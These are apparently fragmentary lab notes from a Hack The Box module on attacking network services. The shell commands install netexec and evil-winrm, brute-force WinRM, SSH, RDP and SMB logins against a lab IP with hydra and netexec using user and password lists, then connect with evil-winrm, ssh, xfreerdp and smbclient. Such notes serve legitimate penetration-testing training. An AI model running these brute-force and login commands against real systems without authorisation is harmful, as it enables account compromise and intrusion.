...
```shell-session
xF1NN@htb[/htb]$ sudo apt-get -y install netexec
```
...
```shell-session
xF1NN@htb[/htb]$ netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```
...
```shell-session
xF1NN@htb[/htb]$ netexec winrm 10.129.42.197 -u user.list -p password.list
...
```shell-session
xF1NN@htb[/htb]$ sudo gem install evil-winrm
...
```shell-session
xF1NN@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
```

  Network Services

```shell-session
xF1NN@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password
...
```shell-session
xF1NN@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197
...
```shell-session
xF1NN@htb[/htb]$ ssh user@10.129.42.197
...
```shell-session
xF1NN@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197
...
```shell-session
xF1NN@htb[/htb]$ xfreerdp /v:10.129.42.197 /u:user /p:password
...
```shell-session
xF1NN@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
...
```shell-session
xF1NN@htb[/htb]$ netexec smb 10.129.42.197 -u "user" -p "password" --shares
...
```shell-session
xF1NN@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME
